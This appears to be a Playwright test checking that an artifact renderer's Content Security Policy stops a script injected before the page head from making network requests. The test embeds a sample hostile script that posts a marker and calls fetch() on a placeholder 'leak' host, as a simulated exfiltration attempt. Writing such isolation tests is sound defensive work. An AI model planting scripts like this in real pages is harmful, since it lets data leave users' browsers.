import { expect, test } from "@playwright/test";
import { artifactSrcDoc } from "../src/lib/artifact-srcdoc.ts";

test("artifact CSP blocks a pre-head script's network request", async ({
	page,
}) => {
	const marker = "artifact-hostile-script-ran";
	const blockedUrl = "https://artifact-csp.invalid/leak";
	const doc = artifactSrcDoc(
		"html",
		`<!doctype html><script>parent.postMessage("${marker}", "*");fetch("${blockedUrl}")</script><html><head></head><body>artifact</body></html>`
	);
	if (!doc) {
		throw new Error("HTML artifact did not produce a srcdoc");
	}

	const requests: string[] = [];
	page.on("request", (request) => {
		if (request.url() === blockedUrl) {
			requests.push(request.url());
		}
	});
	await page.goto("about:blank");
	const scriptRan = page.evaluate(
		({ html, expectedMarker }) =>
			new Promise<boolean>((resolve) => {
				const timeout = window.setTimeout(() => resolve(false), 2000);
				window.addEventListener(
					"message",
					(event) => {
						if (event.data === expectedMarker) {
							window.clearTimeout(timeout);
							resolve(true);
						}
					},
					{ once: true }
				);
				const iframe = document.createElement("iframe");
				iframe.sandbox.add("allow-scripts");
				iframe.srcdoc = html;
				document.body.append(iframe);
			}),
		{ html: doc, expectedMarker: marker }
	);

	await expect(scriptRan).resolves.toBe(true);
	await page.waitForTimeout(100);
	expect(requests).toEqual([]);
});
